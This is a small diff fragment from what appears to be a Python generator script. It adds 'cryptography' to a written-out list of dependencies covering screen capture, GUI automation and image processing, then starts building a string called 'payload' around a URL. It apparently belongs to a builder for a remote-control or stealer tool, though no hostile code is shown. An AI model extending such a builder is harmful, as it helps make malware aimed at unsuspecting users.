@@ -270,7 +270,8 @@ mss==9.0.2
 Pillow==10.4.0
 numpy=="""+requ_numpy+"""
 PyAutoGUI
-opencv-python-headless""")
+opencv-python-headless
+cryptography""")
             f.close()
 
         payload = f"""url = "{url}"
